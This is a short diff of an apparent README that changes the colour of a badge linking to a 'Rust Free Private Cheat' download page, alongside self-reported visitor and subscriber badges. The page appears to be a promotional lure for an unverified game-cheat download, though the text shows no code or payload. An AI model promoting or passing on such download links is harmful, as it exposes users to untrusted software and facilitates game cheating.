@@ -4,7 +4,7 @@
 
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)  
 
-[![Download Rust Free Private Cheat](https://img.shields.io/badge/Download-Rust%20Free%20Private%20Cheat-redyellow)](https://bestsoftonik.github.io/public/)  
+[![Download Rust Free Private Cheat](https://img.shields.io/badge/Download-Rust%20Free%20Private%20Cheat-redviolet)](https://bestsoftonik.github.io/public/)  
 
 ---
 
